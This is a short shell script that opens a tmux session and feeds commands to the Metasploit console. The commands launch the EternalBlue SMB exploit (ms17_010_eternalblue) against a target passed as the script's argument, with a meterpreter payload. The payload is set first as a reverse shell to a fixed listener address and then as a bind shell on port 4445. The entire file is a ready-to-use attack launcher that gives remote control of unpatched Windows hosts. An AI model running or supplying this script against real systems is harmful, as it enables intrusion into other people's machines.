tmux new -s msfcsl -d
tmux send -t "msfcsl" "
use  exploit/windows/smb/ms17_010_eternalblue
set payload windows/meterpreter/reverse_tcp
set LHOST     192.168.28.30
set payload windows/meterpreter/bind_tcp
set LPORT     4445
set RHOST     $1
run -j -z
" Enter
